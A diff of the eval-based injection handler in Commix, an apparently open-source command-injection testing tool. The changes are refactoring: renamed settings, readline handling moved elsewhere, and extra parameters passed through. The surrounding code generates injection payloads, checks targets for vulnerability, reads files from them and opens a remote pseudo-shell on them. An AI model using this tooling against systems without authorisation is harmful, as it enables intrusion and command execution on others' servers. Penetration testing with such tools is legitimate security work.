@@ -3,7 +3,7 @@
 
 """
 This file is part of Commix Project (https://commixproject.com).
-Copyright (c) 2014-2020 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -36,27 +36,6 @@ from src.core.injections.results_based.techniques.eval_based import eb_payloads
 from src.core.injections.results_based.techniques.eval_based import eb_enumeration
 from src.core.injections.results_based.techniques.eval_based import eb_file_access
 
-readline_error = False
-if settings.IS_WINDOWS:
-  try:
-    import readline
-  except ImportError:
-    try:
-      import pyreadline as readline
-    except ImportError:
-      readline_error = True
-else:
-  try:
-    import readline
-    if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
-      import gnureadline as readline
-  except ImportError:
-    try:
-      import gnureadline as readline
-    except ImportError:
-      readline_error = True
-pass
-
 """
 The dynamic code evaluation (aka eval-based) technique.
 """
@@ -64,14 +43,12 @@ The dynamic code evaluation (aka eval-based) technique.
 """
 The "eval-based" injection technique handler.
 """
-def eb_injection_handler(url, timesec, filename, http_request_method):
+def eb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique):
   shell = False
   counter = 1
   vp_flag = True
   no_result = True
   export_injection_info = False
-  injection_type = "results-based dynamic code evaluation"
-  technique = "dynamic code evaluation technique"
 
   for item in range(0, len(settings.EXECUTION_FUNCTIONS)):
     settings.EXECUTION_FUNCTIONS[item] = "${" + settings.EXECUTION_FUNCTIONS[item] + "("
@@ -81,13 +58,13 @@ def eb_injection_handler(url, timesec, filename, http_request_method):
     info_msg = "Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + ". "
     sys.stdout.write(settings.print_info_msg(info_msg))
     sys.stdout.flush()
-    if settings.VERBOSITY_LEVEL >= 1:
-      print("")
+    if settings.VERBOSITY_LEVEL != 0:
+      print(settings.SINGLE_WHITESPACE)
           
   i = 0
   # Calculate all possible combinations
-  total = len(settings.WHITESPACE) * len(settings.EVAL_PREFIXES) * len(settings.EVAL_SEPARATORS) * len(settings.EVAL_SUFFIXES)
-  for whitespace in settings.WHITESPACE:
+  total = len(settings.WHITESPACES) * len(settings.EVAL_PREFIXES) * len(settings.EVAL_SEPARATORS) * len(settings.EVAL_SUFFIXES)
+  for whitespace in settings.WHITESPACES:
     for prefix in settings.EVAL_PREFIXES:
       for suffix in settings.EVAL_SUFFIXES:
         for separator in settings.EVAL_SEPARATORS:
@@ -139,18 +116,18 @@ def eb_injection_handler(url, timesec, filename, http_request_method):
                 # Classic decision payload (check if host is vulnerable).
                 payload = eb_payloads.decision(separator, TAG, randv1, randv2)
 
-              suffix = _urllib.parse.quote(suffix)
+              # suffix = _urllib.parse.quote(suffix)
               # Fix prefixes / suffixes
               payload = parameters.prefixes(payload, prefix)
               payload = parameters.suffixes(payload, suffix)
 
               # Fixation for specific payload.
-              if ")%3B" + _urllib.parse.quote(")}") in payload:
-                payload = payload.replace(")%3B" + _urllib.parse.quote(")}"), ")" + _urllib.parse.quote(")}"))
+              if ")%3B" + ")}" in payload:
+                payload = payload.replace(")%3B" +")}", ")" + ")}")
                 #payload = payload + TAG + ""
 
               # Whitespace fixation
-              payload = payload.replace(" ", whitespace)
+              payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
               
               # Perform payload modification
               payload = checks.perform_payload_modification(payload)
@@ -282,7 +259,7 @@ def eb_injection_handler(url, timesec, filename, http_request_method):
             else:    
               header_name = ""
               the_type = " parameter"
-              if http_request_method == "GET":
+              if not menu.options.data:
                 found_vuln_parameter = parameters.vuln_GET_param(url)
               else :
                 found_vuln_parameter = vuln_parameter
@@ -300,7 +277,7 @@ def eb_injection_handler(url, timesec, filename, http_request_method):
 
             if not settings.LOAD_SESSION:
               if settings.VERBOSITY_LEVEL == 0:
-                print("")
+                print(settings.SINGLE_WHITESPACE)
               else:
                 checks.total_of_requests()
 
@@ -318,7 +295,7 @@ def eb_injection_handler(url, timesec, filename, http_request_method):
             if not settings.LOAD_SESSION:
               session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)
             else:
-              whitespace = settings.WHITESPACE[0]
+              whitespace = settings.WHITESPACES[0]
               settings.LOAD_SESSION = False 
               
             # Check for any enumeration options.
@@ -334,7 +311,7 @@ def eb_injection_handler(url, timesec, filename, http_request_method):
                   enumerate_again = "Y"
                 if enumerate_again in settings.CHOICE_YES:
                   eb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
-                  # print("")
+                  # print(settings.SINGLE_WHITESPACE)
                   break
                 elif enumerate_again in settings.CHOICE_NO:
                   new_line = False
@@ -350,12 +327,12 @@ def eb_injection_handler(url, timesec, filename, http_request_method):
                 eb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
             
             if not menu.file_access_options() and not menu.options.os_cmd and new_line:
-              print("")
+              print(settings.SINGLE_WHITESPACE)
 
             # Check for any system file access options.
             if settings.FILE_ACCESS_DONE == True :
               if settings.ENUMERATION_DONE != True:
-                print("")
+                print(settings.SINGLE_WHITESPACE)
               while True:
                 if not menu.options.batch:
                   question_msg = "Do you want to access files again? [Y/n] > "
@@ -366,7 +343,7 @@ def eb_injection_handler(url, timesec, filename, http_request_method):
                    file_access_again = "Y"
                 if file_access_again in settings.CHOICE_YES:
                   eb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
-                  print("")
+                  print(settings.SINGLE_WHITESPACE)
                   break
                 elif file_access_again in settings.CHOICE_NO: 
                   break
@@ -379,14 +356,14 @@ def eb_injection_handler(url, timesec, filename, http_request_method):
             else:
               if menu.file_access_options():
                 # if not menu.enumeration_options():
-                #   print("")
+                #   print(settings.SINGLE_WHITESPACE)
                 eb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
-                print("")
+                print(settings.SINGLE_WHITESPACE)
 
             # Check if defined single cmd.
             if menu.options.os_cmd:
               # if not menu.file_access_options():
-              #   print("")
+              #   print(settings.SINGLE_WHITESPACE)
               eb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
 
             # Pseudo-Terminal shell
@@ -403,22 +380,15 @@ def eb_injection_handler(url, timesec, filename, http_request_method):
               if len(gotshell) == 0:
                  gotshell = "Y"
               if gotshell in settings.CHOICE_YES:
-                if not menu.options.batch:
-                  print("")
+                # if not menu.options.batch:
+                #   print(settings.SINGLE_WHITESPACE)
                 print("Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)")
-                if readline_error:
+                if settings.READLINE_ERROR:
                   checks.no_readline_module()
                 while True:
                   try:
-                    # Tab compliter
-                    if not readline_error:
-                      readline.set_completer(menu.tab_completer)
-                      # MacOSX tab compliter
-                      if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
-                        readline.parse_and_bind("bind ^I rl_complete")
-                      # Unix tab compliter
-                      else:
-                        readline.parse_and_bind("tab: complete")
+                    if not settings.READLINE_ERROR:
+                      checks.tab_autocompleter()
                     cmd = _input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                     cmd = checks.escaped_cmd(cmd)
                     if cmd.lower() in settings.SHELL_OPTIONS:
@@ -450,8 +420,8 @@ def eb_injection_handler(url, timesec, filename, http_request_method):
                         logs.executed_command(filename, cmd, shell)
                         print("\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n")
                       else:
-                        if settings.VERBOSITY_LEVEL >= 1:
-                          print("")
+                        if settings.VERBOSITY_LEVEL != 0:
+                          print(settings.SINGLE_WHITESPACE)
                         err_msg = "The '" + cmd + "' command, does not return any output."
                         print(settings.print_critical_msg(err_msg) + "\n")
                     
@@ -486,7 +456,7 @@ def eb_injection_handler(url, timesec, filename, http_request_method):
               
   if no_result == True:
     if settings.VERBOSITY_LEVEL == 0:
-      print("")
+      print(settings.SINGLE_WHITESPACE)
     return False
   else :
     sys.stdout.write("\r")
@@ -496,8 +466,8 @@ def eb_injection_handler(url, timesec, filename, http_request_method):
 The exploitation function.
 (call the injection handler)
 """
-def exploitation(url, timesec, filename, http_request_method):
-  if eb_injection_handler(url, timesec, filename, http_request_method) == False:
+def exploitation(url, timesec, filename, http_request_method, injection_type, technique):
+  if eb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique) == False:
     return False
 
 # eof
